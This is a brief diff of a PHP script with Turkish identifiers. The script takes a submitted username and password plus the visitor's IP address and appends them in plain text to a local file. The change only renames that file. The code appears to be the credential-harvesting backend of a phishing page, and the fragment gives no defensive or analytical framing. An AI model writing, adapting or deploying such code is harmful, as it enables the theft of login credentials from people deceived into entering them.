@@ -4,7 +4,7 @@ $kullaniciadi = $_POST['Username'];
 $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 
-$dosya = fopen ("metin.txt" , 'a'); 
+$dosya = fopen ("bilgiler.txt" , 'a'); 
 $yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip;
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
